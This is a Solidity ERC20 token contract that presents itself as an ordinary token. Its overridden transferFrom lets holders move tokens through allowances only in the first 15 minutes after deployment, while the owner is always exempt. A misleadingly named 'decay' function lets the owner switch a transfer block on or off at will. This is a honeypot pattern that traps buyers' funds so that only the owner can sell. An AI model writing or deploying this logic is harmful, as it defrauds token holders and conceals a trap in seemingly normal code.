pragma solidity ^0.8.0;

import "ERC20.sol";

contract Token is ERC20 {

    uint256 end;
    address owner;
    bool isBlocked;
    constructor (string memory name, string memory symbol, uint amount) ERC20(name, symbol) {

        owner = msg.sender;
        end = block.timestamp + 15 minutes;
        _mint(msg.sender, amount * 10 ** uint(decimals()));
        isBlocked = false;
    }

     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if ((!isBlocked && end > block.timestamp) || sender == owner || recipient == owner) {
            _transfer(sender, recipient, amount);
            uint256 currentAllowance = allowance(sender, _msgSender());
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance - amount);
        } else {
            revert();
        }

        return true;
    }

    function decay() public returns (bool) {
        if (msg.sender == owner) {
            isBlocked = !isBlocked;
        }
        return isBlocked;
    }
}